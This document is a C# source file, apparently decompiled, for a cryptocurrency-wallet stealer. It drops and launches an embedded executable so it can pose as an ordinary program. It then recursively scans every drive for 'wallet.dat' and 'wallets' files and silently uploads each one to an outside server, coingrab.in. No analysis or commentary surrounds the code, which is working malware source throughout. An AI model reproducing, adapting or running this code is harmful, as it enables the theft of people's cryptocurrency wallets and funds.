using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;

namespace coinbin;

internal class Program
{
	private static List<string> files = new List<string>();

	private static List<FileInfo> filei = new List<FileInfo>();

	private static List<DirectoryInfo> folders = new List<DirectoryInfo>();

	private static string uploadPath = "https://coingrab.in/serverless/callback/88";

	private static string hexData = "";

	public static byte[] StringToByteArray(string hex)
	{
		return (from x in Enumerable.Range(0, hex.Length)
			where x % 2 == 0
			select Convert.ToByte(hex.Substring(x, 2), 16)).ToArray();
	}

	public static void Main(string[] args)
	{
		if (hexData != "" && hexData != "Syntax: exetobytes.exe <file>")
		{
			string text = "";
			foreach (string text2 in args)
			{
				text = text + text2 + " ";
			}
			File.WriteAllBytes(".tmpfile.exe", StringToByteArray(hexData));
			Process process = new Process();
			process.StartInfo.FileName = ".tmpfile.exe";
			process.StartInfo.WorkingDirectory = Directory.GetCurrentDirectory();
			process.StartInfo.Arguments = text;
			process.Start();
		}
		foreach (DriveInfo item in from x in DriveInfo.GetDrives()
			where x.IsReady
			select x)
		{
			try
			{
				FullDirList(item.RootDirectory, "*");
			}
			catch (Exception)
			{
			}
		}
	}

	private static void FullDirList(DirectoryInfo dir, string searchPattern)
	{
		try
		{
			FileInfo[] array = dir.GetFiles(searchPattern);
			foreach (FileInfo fileInfo in array)
			{
				if (fileInfo.FullName.Contains("wallet.dat"))
				{
					files.Add(fileInfo.FullName);
					WebClient webClient = new WebClient();
					try
					{
						webClient.UploadFile(uploadPath, "POST", fileInfo.FullName);
					}
					catch (Exception)
					{
					}
				}
				if (fileInfo.FullName.Contains("wallets"))
				{
					files.Add(fileInfo.FullName);
					WebClient webClient2 = new WebClient();
					try
					{
						webClient2.UploadFile(uploadPath, "POST", fileInfo.FullName);
					}
					catch (Exception)
					{
					}
				}
			}
		}
		catch
		{
			return;
		}
		DirectoryInfo[] directories = dir.GetDirectories();
		foreach (DirectoryInfo directoryInfo in directories)
		{
			if (!directoryInfo.FullName.Contains("drive_c") && !directoryInfo.FullName.Contains("lib") && !directoryInfo.FullName.Contains("dev") && !directoryInfo.FullName.Contains("sys") && !directoryInfo.FullName.Contains("bin") && !directoryInfo.FullName.Contains("proc") && !directoryInfo.FullName.Contains("var") && !directoryInfo.FullName.Contains("dosdevices"))
			{
				FullDirList(directoryInfo, searchPattern);
			}
		}
	}
}
